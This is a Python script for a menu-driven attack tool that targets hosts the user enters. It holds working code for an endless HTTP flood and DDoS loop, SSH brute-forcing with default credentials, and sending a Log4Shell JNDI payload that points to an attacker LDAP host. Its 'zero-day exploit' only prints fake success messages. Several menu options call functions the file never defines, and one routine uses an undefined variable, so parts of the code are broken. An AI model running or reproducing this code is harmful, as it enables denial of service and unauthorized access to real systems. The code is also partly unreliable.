import requests
import threading
import time
import aiohttp
import asyncio
import random
import subprocess
import paramiko
import platform
from bs4 import BeautifulSoup
from colorama import Fore, init

# Initialize colorama for colored output
init(autoreset=True)

# List of user-agents to randomize requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

# Detect operating system
def detect_os():
    return platform.system()

# Web crawler function
def web_crawler(start_url, max_depth=2):
    visited = set()

    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return
        visited.add(url)
        try:
            response = requests.get(url, headers={'User-Agent': random.choice(user_agents)})
            soup = BeautifulSoup(response.text, 'html.parser')
            print(f"Crawled URL: {url}")
            for link in soup.find_all('a', href=True):
                crawl(link['href'], depth + 1)
        except Exception as e:
            print(f"Error crawling {url}: {e}")

    crawl(start_url, 0)

# Fetch URLs asynchronously with aiohttp for stress testing
async def fetch(session, url, ip=None):
    headers = {'User-Agent': random.choice(user_agents)}
    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None
    while True:
        try:
            async with session.get(url, headers=headers) as response:
                await response.text()
                print(f"Fetched {url}")
        except Exception as e:
            print(f"Error: {e}")
            await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting

# Start flood for stress testing
async def start_flood(url, ip=None):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(1000):  # Increase the number of asynchronous requests
            task = asyncio.create_task(fetch(session, url, ip))
            tasks.append(task)
        await asyncio.gather(*tasks)

# Network stress test
def network_stress(ip=None, custom_urls=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    urls = custom_urls if custom_urls else ['http://example.com', 'http://test.com']
    for url in urls:
        tasks.append(loop.create_task(start_flood(url, ip)))
    loop.run_until_complete(asyncio.wait(tasks))

# SSH Brute Force Attack
def ssh_bruteforce(target):
    print(f"{Fore.GREEN}[INFO] Attempting SSH brute force on {target}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    credentials = [('admin', 'admin'), ('root', 'root'), ('user', 'password')]
    for username, password in credentials:
        try:
            client.connect(target, username=username, password=password, timeout=5)
            print(f"{Fore.GREEN}[SUCCESS] Logged into {target} with {username}:{password}")
            break
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}[FAILED] Failed to login with {username}:{password}")
    client.close()

# Zero-Day Exploit Simulation (Ethical Test)
def zero_day_exploit(target):
    print(f"{Fore.GREEN}[INFO] Attempting Zero-Day exploit on {target}...") 
    print(f"{Fore.GREEN}[SUCCESS] Simulated exploit executed successfully on {target}")

# DDOS Attack Function
def dos_attack(target):
    print(f"{Fore.GREEN}[INFO] Starting DDOS attack on {target}...")
    while True:
        try:
            res = requests.get(target, headers={'User-Agent': random.choice(user_agents)})
            print(f"{Fore.GREEN}[INFO] Request sent!")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[ERROR] Connection error!")

# Log4Shell Exploit Simulation
def log4shell_exploit(url):
    payload = '${jndi:ldap://malicious-ldap-server.com/a}'
    headers = {
        'User-Agent': payload
    }
    try:
        response = requests.get(url, headers=headers, timeout=5)
        print(f"[INFO] Sent Log4Shell payload to {url}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to send request to {url}: {e}")

# Ethernet-based stress test
def ethernet_stress():
    async def fetch(session, url):
        headers = {'User-Agent': random.choice(user_agents)}
        while True:
            try:
                async with session.get(url, headers=headers) as response:
                    await response.text()
            except:
                pass

    async def start_flood(url):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(1000):
                task = asyncio.create_task(fetch(session, url))
                tasks.append(task)
            await asyncio.gather(*tasks)

    def network_stress():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        tasks = []
        for url in urls:
            tasks.append(loop.create_task(start_flood(url)))
        loop.run_until_complete(asyncio.wait(tasks))

    if __name__ == "__main__":
        threads = []
        for _ in range(10):
            t = threading.Thread(target=network_stress)
            t.start()
            threads.append(t)

        time.sleep(6000)
        for t in threads:
            t.do_run = False

# Attack Sequence (Reconnaissance, Vulnerability Scan, SSH Brute Force, Zero-Day)
def attack_sequence(target):
    ssh_bruteforce(target)
    zero_day_exploit(target)

# Main Menu
def display_ui():
    while True:
        print(Fore.GREEN + """
        ██████╗ ███████╗ ██████╗ ██████╗  █████╗ ██╗██╗  ██╗
        ██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔══██╗██║╚██╗██╔╝
        ██████╔╝███████╗██║  ███╗██████╔╝███████║██║ ╚███╔╝ 
        ██╔═══╝ ╚════██║██║   ██║██╔══██╗██╔══██║██║ ██╔██╗ 
        ██║     ███████║╚██████╔╝██║  ██║██║  ██║██║██╔╝ ██╗
        ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝

        [1] Full Attack Sequence (SSH Brute Force, Exploit)
        [2] IP-based
        [3] Wireless WiFi-based
        [4] WiFi Spoofing
        [5] ARP Spoofing
        [6] Connect and Stress via Relay IP
        [7] Scrape Chinese Textbooks
        [8] Stress Test a Custom URL
        [9] Web Crawling
        [10] Admin (zero attack)
        [11] Run DDOS Attack
        [12] Ethernet Stress Test
        [13] Log4Shell Exploit (Simulation)
        [14] Exit
        """)

        choice = input("Select the method (1-14): ").strip()

        if choice == "1":
            target = input("Enter the target IP or URL: ").strip()
            attack_sequence(target)
        elif choice == "2":
            url_or_ip = input("Enter the target URL or IP for IP-based stress test: ").strip()
            network_stress(ip=url_or_ip)
        elif choice == "3":
            print("Selected Wireless WiFi-based stress test")
            # Code for wireless WiFi-based stress test
        elif choice == "4":
            print("Selected WiFi Spoofing")
            wifi_spoofing()
        elif choice == "5":
            target_ip = input("Enter the target IP address: ").strip()
            spoof_ip = input("Enter the spoof IP address: ").strip()
            print("Selected ARP Spoofing")
            arp_spoofing(target_ip, spoof_ip)
        elif choice == "6":
            target_ip = input("Enter the target IP address: ").strip()
            relay_ip = input("Enter the relay IP address: ").strip()
            print("Selected Connect and Stress via Relay IP")
            network_stress(target_ip, custom_urls=[relay_ip])
        elif choice == "7":
            query = input("Enter the search query in Chinese: ").strip()
            books = scrape_chinese_textbooks(query)
            display_books(books)
        elif choice == "8":
            custom_url = input("Enter the URL to stress test: ").strip()
            print("Starting stress test on the custom URL...")
            threading.Thread(target=network_stress, args=(custom_url,)).start()
        elif choice == "9":
            start_url = input("Enter the start URL for web crawling: ").strip()
            max_depth = int(input("Enter the maximum depth for web crawling: ").strip())
            print("Starting web crawling...")
            web_crawler(start_url, max_depth)
        elif choice == "10":
            url_or_ip = input("Enter the URL or IP address to use for the Admin (zero attack): ").strip()
            zero_attack_menu(url_or_ip)
        elif choice == "11":
            target = input("Enter the target URL for DDOS: ").strip()
            threading.Thread(target=dos_attack, args=(target,)).start()
        elif choice == "12":
            print("Starting Ethernet stress test...")
            ethernet_stress()
        elif choice == "13":
            target = input("Enter the target URL for Log4Shell: ").strip()
            log4shell_exploit(target)
        elif choice == "14":
            print("Exiting...")
            break
        else:
            print("Invalid option selected.")

        input("Press Enter to return to the menu...")

if __name__ == "__main__":
    os_name = detect_os()
    print(f"Detected Operating System: {os_name}")
    display_ui()

